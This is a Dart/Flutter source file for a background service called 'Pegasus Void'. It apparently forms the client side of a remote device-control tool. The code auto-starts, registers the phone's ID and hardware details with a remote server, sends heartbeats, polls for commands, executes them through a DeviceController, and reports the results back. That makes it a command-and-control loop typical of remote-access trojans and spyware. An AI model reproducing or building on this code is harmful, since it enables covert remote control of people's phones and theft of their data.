import 'dart:async';
import 'dart:ui';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'api_service.dart';
import 'device_controller.dart';
import '../models/device_info.dart';

class BackgroundService {
  static final FlutterLocalNotificationsPlugin notificationsPlugin =
      FlutterLocalNotificationsPlugin();

  static Future<void> initializeService() async {
    final service = FlutterBackgroundService();

    const AndroidNotificationChannel channel = AndroidNotificationChannel(
      'pegasus_void_channel',
      'Pegasus Void Service',
      description: 'Background service untuk Pegasus Void',
      importance: Importance.low,
    );

    await notificationsPlugin
        .resolvePlatformSpecificImplementation<
            AndroidFlutterLocalNotificationsPlugin>()
        ?.createNotificationChannel(channel);

    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        autoStart: true,
        isForegroundMode: true,
        notificationChannelId: 'pegasus_void_channel',
        initialNotificationTitle: 'Pegasus Void',
        initialNotificationContent: 'Service berjalan di background',
        foregroundServiceNotificationId: 888,
      ),
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: onStart,
        onBackground: onIosBackground,
      ),
    );

    service.startService();
  }

  @pragma('vm:entry-point')
  static Future<bool> onIosBackground(ServiceInstance service) async {
    WidgetsFlutterBinding.ensureInitialized();
    DartPluginRegistrant.ensureInitialized();
    return true;
  }

  @pragma('vm:entry-point')
  static void onStart(ServiceInstance service) async {
    DartPluginRegistrant.ensureInitialized();

    // Get device info
    final prefs = await SharedPreferences.getInstance();
    String? deviceId = prefs.getString('device_id');

    if (deviceId == null) {
      // Generate device ID
      final deviceInfo = DeviceInfoPlugin();
      final androidInfo = await deviceInfo.androidInfo;
      deviceId = androidInfo.id;
      await prefs.setString('device_id', deviceId);

      // Register device
      final deviceInfoModel = DeviceInfoModel(
        deviceId: deviceId,
        deviceName: androidInfo.model,
        model: androidInfo.model,
        brand: androidInfo.brand,
        osVersion: androidInfo.version.release,
        appVersion: '1.0.0',
        lastSeen: DateTime.now(),
        isOnline: true,
      );

      await ApiService.registerDevice(deviceInfoModel);
    }

    // Start heartbeat
    ApiService.startHeartbeat(deviceId);

    // Start command checking
    ApiService.startCommandCheck(deviceId, (command) async {
      final result = await DeviceController.executeCommand(command);
      await ApiService.sendCommandResponse(
        deviceId!,
        command['commandId'] ?? '',
        result,
      );
    });

    // Listen for service stop
    service.on('stopService').listen((event) {
      ApiService.stopTimers();
      service.stopSelf();
    });

    // Update notification periodically
    Timer.periodic(const Duration(seconds: 30), (timer) async {
      if (!await service.isRunning()) {
        timer.cancel();
        return;
      }

      notificationsPlugin.show(
        888,
        'Pegasus Void',
        'Service aktif - ${DateTime.now().toString().substring(11, 19)}',
        const NotificationDetails(
          android: AndroidNotificationDetails(
            'pegasus_void_channel',
            'Pegasus Void Service',
            icon: 'ic_bg_service_small',
            ongoing: true,
          ),
        ),
      );
    });
  }

  static Future<void> stopService() async {
    final service = FlutterBackgroundService();
    service.invoke('stopService');
  }
}
